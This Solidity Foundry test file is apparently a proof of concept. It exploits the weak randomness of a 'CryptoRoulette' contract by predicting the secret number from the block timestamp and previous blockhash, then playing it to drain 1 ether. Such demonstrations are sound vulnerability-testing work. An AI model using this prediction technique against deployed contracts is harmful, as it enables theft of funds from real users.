// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/crypto_roulette.sol";

contract CryptoRouletteTest is Test {
    CryptoRoulette roulette;
    uint256 constant BLOCK_NUMBER = 100;
    
    function setUp() public {
        // Setup predictable blockchain environment
        vm.roll(BLOCK_NUMBER);
        vm.warp(1);  // Timestamp = 1
        
        // Deploy the contract in the predictable environment
        roulette = new CryptoRoulette();
        
        // Fund the contract
        vm.deal(address(roulette), 1 ether);
    }

    function testWeakPRNG() public {
        // Record initial balances before any attack activity
        uint256 initTestBalance = address(this).balance;
        uint256 initRouletteBalance = address(roulette).balance;
        
        // Get prediction parameters
        uint256 timestamp = block.timestamp;
        bytes32 prevBlockHash = blockhash(BLOCK_NUMBER - 1);
        
        // Generate the same secret number using vulnerable algorithm
        bytes32 data = keccak256(abi.encodePacked(timestamp, prevBlockHash));
        uint8 predictedNumber = uint8(uint256(data)) % 20 + 1;
        
        // Prepare verdict placeholder
        string memory verdictReason;
        
        // Only proceed with attack if prediction is valid (1-10)
        if (predictedNumber <= 10) {
            console.log("--- BEFORE-Trigger Attack ---");
            console.log("Test contract balance: %d", initTestBalance);
            console.log("Roulette contract balance: %d", initRouletteBalance);
            
            console.log("--- Trigger Attack ---");
            roulette.play{value: 0}(predictedNumber);
            
            console.log("--- AFTER-Trigger Attack ---");
            uint256 afterTestBalance = address(this).balance;
            uint256 afterRouletteBalance = address(roulette).balance;
            console.log("Test contract balance: %d", afterTestBalance);
            console.log("Roulette contract balance: %d", afterRouletteBalance);
            
            // Verify balance changes match expectations
            assertEq(
                afterTestBalance, 
                initTestBalance + 1 ether, 
                "Test contract should gain 1 ether"
            );
            assertEq(
                afterRouletteBalance, 
                initRouletteBalance - 1 ether, 
                "Roulette contract should lose 1 ether"
            );
            verdictReason = "Successfully exploited weak PRNG to win 1 ETH";
        } else {
            console.log("--- Attack Skipped (Prediction >10) ---");
            verdictReason = "Weak PRNG exists but prediction out of playable range";
        }
        console.log("Vulnerability Exists: %s", verdictReason);
    }
    
    receive() external payable {}
}